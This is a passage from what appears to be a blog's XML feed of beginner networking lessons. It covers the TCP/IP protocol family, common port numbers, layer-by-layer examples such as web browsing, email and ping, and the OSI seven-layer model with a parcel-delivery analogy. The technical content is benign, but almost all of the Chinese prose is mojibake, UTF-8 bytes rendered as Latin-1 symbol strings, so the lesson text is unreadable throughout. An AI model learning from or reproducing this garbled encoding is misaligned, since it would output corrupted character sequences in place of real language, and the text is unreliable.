3ï¼šç»˜åˆ¶æ•°æ®åŒ…ç»“æ„</h3><p>ç”»å‡ºä¸€ä¸ªå®Œæ•´çš„HTTPè¯·æ±‚æ•°æ®åŒ…çš„ç»“æ„ï¼Œæ ‡æ³¨æ¯ä¸€å±‚çš„å¤´éƒ¨ã€‚</p><h3 id="ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•">ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•</h3><p>æ‰©å±•æ•°æ®åŒ…åˆ†æå™¨ï¼š</p><ol><li>æ·»åŠ æ•°æ®åŒ…è¿‡æ»¤åŠŸèƒ½ï¼ˆåªæ˜¾ç¤ºç‰¹å®šåè®®ï¼‰</li><li>ç»Ÿè®¡å„åè®®çš„æ•°æ®åŒ…æ•°é‡</li><li>å°†æ•è·çš„æ•°æ®åŒ…ä¿å­˜åˆ°æ–‡ä»¶</li></ol><h3 id="ç»ƒä¹ 5ï¼šæ€è€ƒé¢˜">ç»ƒä¹ 5ï¼šæ€è€ƒé¢˜</h3><ol><li>ä¸ºä»€ä¹ˆTCP/IPæ¨¡å‹åªæœ‰4å±‚è€ŒOSIæœ‰7å±‚ï¼Ÿ</li><li>è·¯ç”±å™¨å·¥ä½œåœ¨å“ªä¸€å±‚ï¼Ÿäº¤æ¢æœºå‘¢ï¼Ÿ</li><li>é˜²ç«å¢™å¯èƒ½å·¥ä½œåœ¨å“ªå‡ å±‚ï¼Ÿ</li></ol><h2 id="ğŸ“š-æ‰©å±•é˜…è¯»">ğŸ“š æ‰©å±•é˜…è¯»</h2><h3 id="TCP-IPåè®®æ—">TCP/IPåè®®æ—</h3><p>TCP/IPä¸ä»…ä»…æ˜¯TCPå’ŒIPä¸¤ä¸ªåè®®ï¼Œè€Œæ˜¯ä¸€æ•´ä¸ªåè®®æ—ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">åº”ç”¨å±‚ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ HTTP  FTP  <span class="hljs-built_in"> DNS </span>  SMTP  SSH  ç­‰<span class="hljs-built_in">..</span>. â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ä¼ è¾“å±‚ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   TCP    â”‚   UDP    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç½‘é™…å±‚ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  <span class="hljs-built_in"> IP </span>  ICMP   ARP   IGMP   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ç½‘ç»œæ¥å£å±‚ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ <span class="hljs-built_in"> Ethernet </span> WiFi <span class="hljs-built_in"> PPP </span> ç­‰<span class="hljs-built_in">..</span>. â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="å¸¸è§ç«¯å£å·è®°å¿†">å¸¸è§ç«¯å£å·è®°å¿†</h3><p><strong>HTTPå®¶æ—</strong>ï¼š</p><ul><li>80ï¼šHTTP</li><li>443ï¼šHTTPS</li><li>8080ï¼šHTTPä»£ç†</li></ul><p><strong>æ–‡ä»¶ä¼ è¾“</strong>ï¼š</p><ul><li>20/21ï¼šFTP</li><li>22ï¼šSFTPï¼ˆSSHï¼‰</li><li>69ï¼šTFTP</li></ul><p><strong>é‚®ä»¶</strong>ï¼š</p><ul><li>25ï¼šSMTPï¼ˆå‘é€ï¼‰</li><li>110ï¼šPOP3ï¼ˆæ¥æ”¶ï¼‰</li><li>143ï¼šIMAPï¼ˆæ¥æ”¶ï¼‰</li></ul><p><strong>æ•°æ®åº“</strong>ï¼š</p><ul><li>3306ï¼šMySQL</li><li>5432ï¼šPostgreSQL</li><li>27017ï¼šMongoDB</li><li>6379ï¼šRedis</li></ul><p><strong>è¿œç¨‹</strong>ï¼š</p><ul><li>22ï¼šSSH</li><li>23ï¼šTelnet</li><li>3389ï¼šRDPï¼ˆWindowsè¿œç¨‹æ¡Œé¢ï¼‰</li></ul><h3 id="å®é™…åº”ç”¨åœºæ™¯">å®é™…åº”ç”¨åœºæ™¯</h3><ol><li><p><strong>æµè§ˆç½‘é¡µ</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">åº”ç”¨å±‚ï¼šHTTPè¯·æ±‚ www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>ä¼ è¾“å±‚ï¼šTCP ç«¯å£<span class="hljs-number">80</span><br>ç½‘é™…å±‚ï¼šIPåœ°å€ <span class="hljs-number">220.181</span>.<span class="hljs-number">38.148</span><br>ç½‘ç»œæ¥å£å±‚ï¼šé€šè¿‡ä»¥å¤ªç½‘å‘é€<br></code></pre></td></tr></table></figure></li><li><p><strong>å‘é€é‚®ä»¶</strong>ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino">åº”ç”¨å±‚ï¼šSMTPåè®®<br>ä¼ è¾“å±‚ï¼šTCP ç«¯å£<span class="hljs-number">25</span><br>ç½‘é™…å±‚ï¼šIPåœ°å€ï¼ˆé‚®ä»¶æœåŠ¡å™¨ï¼‰<br>ç½‘ç»œæ¥å£å±‚ï¼š<span class="hljs-built_in">WiFi</span><br></code></pre></td></tr></table></figure></li><li><p><strong>pingå‘½ä»¤</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">åº”ç”¨å±‚ï¼šæ— ï¼ˆICMPæ˜¯ç½‘é™…å±‚åè®®ï¼‰<br>ä¼ è¾“å±‚ï¼šæ— <br>ç½‘é™…å±‚ï¼šICMP <span class="hljs-built_in">echo</span> request<br>ç½‘ç»œæ¥å£å±‚ï¼šä»¥å¤ªç½‘<br></code></pre></td></tr></table></figure></li></ol><h2 id="ğŸ¯-æ˜å¤©é¢„å‘Š">ğŸ¯ æ˜å¤©é¢„å‘Š</h2><p><strong>ç¬¬5å¤©ï¼šç½‘ç»œå‘½ä»¤å…¥é—¨ - ping</strong></p><p>æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><ul><li>pingå‘½ä»¤çš„å·¥ä½œåŸç†</li><li>ICMPåè®®è¯¦è§£</li><li>RTTï¼ˆå¾€è¿”æ—¶é—´ï¼‰çš„è®¡ç®—</li><li>ç¼–å†™è‡ªå·±çš„pingå·¥å…·</li></ul><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šæŒæ¡TCP/IPï¼Œå°±æŒæ¡äº†äº’è”ç½‘çš„è¯­è¨€ï¼</p><p>ğŸ‘‰ <a href="day03.md">ä¸Šä¸€å¤©ï¼šOSIä¸ƒå±‚æ¨¡å‹</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day05.md">ä¸‹ä¸€å¤©ï¼špingå‘½ä»¤è¯¦è§£</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3å¤©ï¼šOSIä¸ƒå±‚æ¨¡å‹</title>
    <link href="/2025/11/10/3%E5%A4%A9%EF%BC%9AOSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"/>
    <url>/2025/11/10/3%E5%A4%A9%EF%BC%9AOSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬3å¤©ï¼šOSIä¸ƒå±‚æ¨¡å‹</h1><blockquote><p>â€œç½‘ç»œåè®®å°±åƒæµæ°´çº¿ï¼Œæ¯ä¸€å±‚éƒ½æœ‰è‡ªå·±çš„åˆ†å·¥ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£ä»€ä¹ˆæ˜¯OSIä¸ƒå±‚æ¨¡å‹</li><li>æŒæ¡æ¯ä¸€å±‚çš„ä½œç”¨</li><li>ç†è§£æ•°æ®å°è£…å’Œè§£å°è£…è¿‡ç¨‹</li><li>ç¼–å†™ç¨‹åºæ¼”ç¤ºåè®®åˆ†å±‚</li></ul><h2 id="ğŸ¯-ä¸ºä»€ä¹ˆè¦åˆ†å±‚ï¼Ÿ">ğŸ¯ ä¸ºä»€ä¹ˆè¦åˆ†å±‚ï¼Ÿ</h2><h3 id="ç”Ÿæ´»ä¸­çš„ä¾‹å­ï¼šå¿«é€’ç³»ç»Ÿ">ç”Ÿæ´»ä¸­çš„ä¾‹å­ï¼šå¿«é€’ç³»ç»Ÿ</h3><p>æƒ³è±¡ä½ è¦ç»™ä¸Šæµ·çš„æœ‹å‹å¯„ä¸€æœ¬ä¹¦ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">ä½ å†™ä¿¡ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; æœ‹å‹è¯»ä¿¡<br>  â†“                                      â†‘<br>åŒ…è£…å¿«é€’ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; æ‹†å¼€å¿«é€’<br>  â†“                                      â†‘<br>åˆ†æ‹£ä¸­å¿ƒ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; åˆ†æ‹£ä¸­å¿ƒ<br>  â†“                                      â†‘<br>è¿è¾“è½¦è¾† â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; è¿è¾“è½¦è¾†<br></code></pre></td></tr></table></figure><p><strong>æ¯ä¸€å±‚åªå…³å¿ƒè‡ªå·±çš„å·¥ä½œ</strong>ï¼š</p><ul><li>ä½ åªéœ€è¦å†™ä¿¡ï¼Œä¸ç®¡æ€ä¹ˆè¿è¾“</li><li>å¿«é€’å‘˜åªè´Ÿè´£åŒ…è£…ï¼Œä¸ç®¡å†™çš„ä»€ä¹ˆ</li><li>å¸æœºåªè´Ÿè´£å¼€è½¦ï¼Œä¸ç®¡åŒ…è£¹é‡Œæ˜¯ä»€ä¹ˆ</li></ul><p>è¿™å°±æ˜¯<strong>åˆ†å±‚çš„æ€æƒ³</strong>ï¼</p><h3 id="åˆ†å±‚çš„å¥½å¤„">åˆ†å±‚çš„å¥½å¤„</h3><ol><li><strong>é™ä½å¤æ‚åº¦</strong>ï¼šæ¯å±‚åªå¤„ç†è‡ªå·±çš„ä»»åŠ¡</li><li><strong>æ ‡å‡†åŒ–æ¥å£</strong>ï¼šå±‚ä¸å±‚ä¹‹é—´æœ‰æ˜ç¡®çš„æ¥å£</li><li><strong>æ˜“äºç»´æŠ¤</strong>ï¼šä¿®æ”¹æŸä¸€å±‚ä¸å½±å“å…¶ä»–å±‚</li><li><strong>å¯æ›¿æ¢</strong>ï¼šå¯ä»¥æ›´æ¢æŸä¸€å±‚çš„å®ç°</li></ol><h2 id="ğŸ“Š-OSIä¸ƒå±‚æ¨¡å‹">ğŸ“Š OSIä¸ƒå±‚æ¨¡å‹</h2><p><strong>OSI</strong>ï¼ˆOpen Systems Interconnectionï¼‰æ˜¯å›½é™…æ ‡å‡†åŒ–ç»„ç»‡ï¼ˆISOï¼‰åˆ¶å®šçš„ç½‘ç»œæ¨¡å‹ã€‚</p><h3 id="ä¸ƒå±‚æ¦‚è§ˆ">ä¸ƒå±‚æ¦‚è§ˆ</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  å±‚æ¬¡       â”‚  åç§°      â”‚  ä½œç”¨        â”‚  ä¾‹å­        â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç¬¬<span class="hljs-number">7</span>å±‚      â”‚  åº”ç”¨å±‚    â”‚  ä¸ºç”¨æˆ·æä¾›  â”‚  HTTPã€FTP   â”‚<br>â”‚             â”‚Application â”‚  ç½‘ç»œæœåŠ¡    â”‚  SMTPã€DNS   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç¬¬<span class="hljs-number">6</span>å±‚      â”‚  è¡¨ç¤ºå±‚    â”‚  æ•°æ®æ ¼å¼è½¬æ¢â”‚  åŠ å¯†ã€å‹ç¼©  â”‚<br>â”‚             â”‚Presentationâ”‚  ç¼–ç ã€åŠ å¯†  â”‚  JPEGã€MPEG  â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç¬¬<span class="hljs-number">5</span>å±‚      â”‚  ä¼šè¯å±‚    â”‚  å»ºç«‹ã€ç®¡ç†  â”‚  RPCã€SQL    â”‚<br>â”‚             â”‚Session     â”‚  ä¼šè¯        â”‚              â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç¬¬<span class="hljs-number">4</span>å±‚      â”‚  ä¼ è¾“å±‚    â”‚  ç«¯åˆ°ç«¯é€šä¿¡  â”‚  TCPã€UDP    â”‚<br>â”‚             â”‚Transport   â”‚  å¯é ä¼ è¾“    â”‚              â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç¬¬<span class="hljs-number">3</span>å±‚      â”‚  ç½‘ç»œå±‚    â”‚  è·¯ç”±é€‰æ‹©    â”‚  IPã€ICMP    â”‚<br>â”‚             â”‚Network     â”‚  å¯»å€        â”‚              â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç¬¬<span class="hljs-number">2</span>å±‚      â”‚  æ•°æ®é“¾è·¯å±‚â”‚  å¸§ä¼ è¾“      â”‚  <span class="hljs-built_in">Ethernet</span>    â”‚<br>â”‚             â”‚Data Link   â”‚  é”™è¯¯æ£€æµ‹    â”‚  <span class="hljs-built_in">WiFi</span>ã€PPP   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç¬¬<span class="hljs-number">1</span>å±‚      â”‚  ç‰©ç†å±‚    â”‚  æ¯”ç‰¹ä¼ è¾“    â”‚  ç½‘çº¿ã€å…‰çº¤  â”‚<br>â”‚             â”‚Physical    â”‚  ç”µä¿¡å·      â”‚  æ— çº¿ç”µæ³¢    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="è®°å¿†å£è¯€">è®°å¿†å£è¯€</h3><p><strong>ä»ä¸Šåˆ°ä¸‹</strong>ï¼š</p><ul><li>åº”ï¼ˆåº”ç”¨å±‚ï¼‰</li><li>è¡¨ï¼ˆè¡¨ç¤ºå±‚ï¼‰</li><li>ä¼šï¼ˆä¼šè¯å±‚ï¼‰</li><li>ä¼ ï¼ˆä¼ è¾“å±‚ï¼‰</li><li>ç½‘ï¼ˆç½‘ç»œå±‚ï¼‰</li><li>æ•°ï¼ˆæ•°æ®é“¾è·¯å±‚ï¼‰</li><li>ç‰©ï¼ˆç‰©ç†å±‚ï¼‰</li></ul><p><strong>è‹±æ–‡å£è¯€</strong>ï¼šAll People Seem To Need Data Processing</p><h2 id="ğŸ”-å„å±‚è¯¦è§£">ğŸ” å„å±‚è¯¦è§£</h2><h3 id="ç¬¬7å±‚ï¼šåº”ç”¨å±‚ï¼ˆApplication-Layerï¼‰">ç¬¬7å±‚ï¼šåº”ç”¨å±‚ï¼ˆApplication Layerï¼‰</h3><p><strong>ä½œç”¨</strong>ï¼šä¸ºåº”ç”¨ç¨‹åºæä¾›ç½‘ç»œæœåŠ¡</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šä½ ç›´æ¥ä½¿ç”¨çš„è½¯ä»¶å±‚é¢</p><p><strong>ä¾‹å­</strong>ï¼š</p><ul><li>æµè§ˆå™¨æ‰“å¼€ç½‘é¡µï¼ˆHTTP/HTTPSï¼‰</li><li>æ”¶å‘é‚®ä»¶ï¼ˆSMTP/POP3ï¼‰</li><li>ä¸‹è½½æ–‡ä»¶ï¼ˆFTPï¼‰</li><li>åŸŸåè§£æï¼ˆDNSï¼‰</li></ul><p><strong>ç±»æ¯”</strong>ï¼šå¿«é€’å…¬å¸çš„å®¢æœçª—å£</p><hr><h3 id="ç¬¬6å±‚ï¼šè¡¨ç¤ºå±‚ï¼ˆPresentation-Layerï¼‰">ç¬¬6å±‚ï¼šè¡¨ç¤ºå±‚ï¼ˆPresentation Layerï¼‰</h3><p><strong>ä½œç”¨</strong>ï¼šæ•°æ®æ ¼å¼è½¬æ¢ã€åŠ å¯†ã€å‹ç¼©</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šç¿»è¯‘å®˜</p><p><strong>ä¾‹å­</strong>ï¼š</p><ul><li>JPEGå›¾ç‰‡æ ¼å¼</li><li>MP3éŸ³é¢‘æ ¼å¼</li><li>åŠ å¯†ç®—æ³•ï¼ˆSSL/TLSï¼‰</li><li>å­—ç¬¦ç¼–ç ï¼ˆUTF-8ï¼‰</li></ul><p><strong>ç±»æ¯”</strong>ï¼šå¿«é€’åŒ…è£…ã€å°è£…</p><hr><h3 id="ç¬¬5å±‚ï¼šä¼šè¯å±‚ï¼ˆSession-Layerï¼‰">ç¬¬5å±‚ï¼šä¼šè¯å±‚ï¼ˆSession Layerï¼‰</h3><p><strong>ä½œç”¨</strong>ï¼šå»ºç«‹ã€ç®¡ç†ã€ç»ˆæ­¢ä¼šè¯</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šè´Ÿè´£é€šè¯çš„æ¥çº¿å‘˜</p><p><strong>ä¾‹å­</strong>ï¼š</p><ul><li>ç™»å½•ä¼šè¯</li><li>æ•°æ®åº“è¿æ¥</li><li>RPCè¿œç¨‹è°ƒç”¨</li></ul><p><strong>ç±»æ¯”</strong>ï¼šå¿«é€’å•å·ç®¡ç†ç³»ç»Ÿ</p><hr><h3 id="ç¬¬4å±‚ï¼šä¼ è¾“å±‚ï¼ˆTransport-Layerï¼‰">ç¬¬4å±‚ï¼šä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰</h3><p><strong>ä½œç”¨</strong>ï¼šç«¯åˆ°ç«¯çš„å¯é ä¼ è¾“</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šç¡®ä¿åŒ…è£¹å®Œæ•´é€è¾¾</p><p><strong>ä¾‹å­</strong>ï¼š</p><ul><li>TCPï¼šå¯é ä¼ è¾“ï¼Œç¡®ä¿æ•°æ®ä¸ä¸¢å¤±</li><li>UDPï¼šå¿«é€Ÿä¼ è¾“ï¼Œä¸ä¿è¯å¯é </li></ul><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼šç«¯å£å·ï¼ˆåŒºåˆ†ä¸åŒçš„åº”ç”¨ï¼‰</p><p><strong>ç±»æ¯”</strong>ï¼šå¿«é€’å…¬å¸çš„åˆ†å‘ç³»ç»Ÿ</p><hr><h3 id="ç¬¬3å±‚ï¼šç½‘ç»œå±‚ï¼ˆNetwork-Layerï¼‰">ç¬¬3å±‚ï¼šç½‘ç»œå±‚ï¼ˆNetwork Layerï¼‰</h3><p><strong>ä½œç”¨</strong>ï¼šè·¯ç”±é€‰æ‹©å’Œå¯»å€</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šæ‰¾åˆ°æœ€ä½³è·¯å¾„</p><p><strong>ä¾‹å­</strong>ï¼š</p><ul><li>IPåè®®ï¼ˆIPåœ°å€ï¼‰</li><li>è·¯ç”±å™¨å·¥ä½œåœ¨è¿™ä¸€å±‚</li></ul><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼šIPåœ°å€ï¼ˆå®šä½è®¾å¤‡ä½ç½®ï¼‰</p><p><strong>ç±»æ¯”</strong>ï¼šå¿«é€’è¿è¾“è·¯çº¿è§„åˆ’</p><hr><h3 id="ç¬¬2å±‚ï¼šæ•°æ®é“¾è·¯å±‚ï¼ˆData-Link-Layerï¼‰">ç¬¬2å±‚ï¼šæ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰</h3><p><strong>ä½œç”¨</strong>ï¼šå¸§ä¼ è¾“ï¼Œç›¸é‚»èŠ‚ç‚¹ä¹‹é—´çš„æ•°æ®ä¼ è¾“</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šåŒä¸€æ¡è¡—é“å†…çš„ä¼ é€</p><p><strong>ä¾‹å­</strong>ï¼š</p><ul><li>ä»¥å¤ªç½‘ï¼ˆEthernetï¼‰</li><li>WiFi</li><li>MACåœ°å€</li></ul><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼šMACåœ°å€ï¼ˆç½‘å¡çš„ç‰©ç†åœ°å€ï¼‰</p><p><strong>ç±»æ¯”</strong>ï¼šåŒåŸå¿«é€’ç«™ç‚¹ä¹‹é—´çš„ä¼ é€’</p><hr><h3 id="ç¬¬1å±‚ï¼šç‰©ç†å±‚ï¼ˆPhysical-Layerï¼‰">ç¬¬1å±‚ï¼šç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰</h3><p><strong>ä½œç”¨</strong>ï¼šåœ¨ç‰©ç†åª’ä»‹ä¸Šä¼ è¾“æ¯”ç‰¹æµ</p><p><strong>é€šä¿—ç†è§£</strong>ï¼šå®é™…çš„ä¼ è¾“ä»‹è´¨</p><p><strong>ä¾‹å­</strong>ï¼š</p><ul><li>ç½‘çº¿ï¼ˆåŒç»çº¿ï¼‰</li><li>å…‰çº¤</li><li>æ— çº¿ç”µæ³¢</li></ul><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼šç”µä¿¡å·ã€å…‰ä¿¡å·ã€æ— çº¿ä¿¡å·</p><p><strong>ç±»æ¯”</strong>ï¼šå¿«é€’è½¦ã€é£æœºã€è½®èˆ¹</p><h2 id="ğŸ“¦-æ•°æ®å°è£…è¿‡ç¨‹">ğŸ“¦ æ•°æ®å°è£…è¿‡ç¨‹</h2><p>å½“ä½ å‘é€æ•°æ®æ—¶ï¼Œæ•°æ®ä¼šç»è¿‡<strong>å°è£…</strong>è¿‡ç¨‹ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">åº”ç”¨å±‚ï¼š    [ç”¨æˆ·æ•°æ®]<br>              â†“ æ·»åŠ åº”ç”¨å±‚å¤´éƒ¨<br>è¡¨ç¤ºå±‚ï¼š    [è¡¨ç¤ºå±‚å¤´éƒ¨|<span class="hljs-string">ç”¨æˆ·æ•°æ®]</span><br><span class="hljs-string">              â†“ æ·»åŠ ä¼šè¯å±‚å¤´éƒ¨</span><br><span class="hljs-string">ä¼šè¯å±‚ï¼š    [ä¼šè¯å±‚å¤´éƒ¨</span>|<span class="hljs-string">è¡¨ç¤ºå±‚å¤´éƒ¨</span>|<span class="hljs-string">ç”¨æˆ·æ•°æ®]</span><br><span class="hljs-string">              â†“ æ·»åŠ ä¼ è¾“å±‚å¤´éƒ¨</span><br><span class="hljs-string">ä¼ è¾“å±‚ï¼š    [TCPå¤´éƒ¨</span>|<span class="hljs-string">æ•°æ®] â† ç§°ä¸º&quot;æ®µ&quot;ï¼ˆSegmentï¼‰</span><br><span class="hljs-string">              â†“ æ·»åŠ ç½‘ç»œå±‚å¤´éƒ¨</span><br><span class="hljs-string">ç½‘ç»œå±‚ï¼š    [IPå¤´éƒ¨</span>|<span class="hljs-string">TCPå¤´éƒ¨</span>|<span class="hljs-string">æ•°æ®] â† ç§°ä¸º&quot;åŒ…&quot;ï¼ˆPacketï¼‰</span><br><span class="hljs-string">              â†“ æ·»åŠ æ•°æ®é“¾è·¯å±‚å¤´éƒ¨å’Œå°¾éƒ¨</span><br><span class="hljs-string">æ•°æ®é“¾è·¯å±‚ï¼š[å¸§å¤´</span>|<span class="hljs-string">IPå¤´éƒ¨</span>|<span 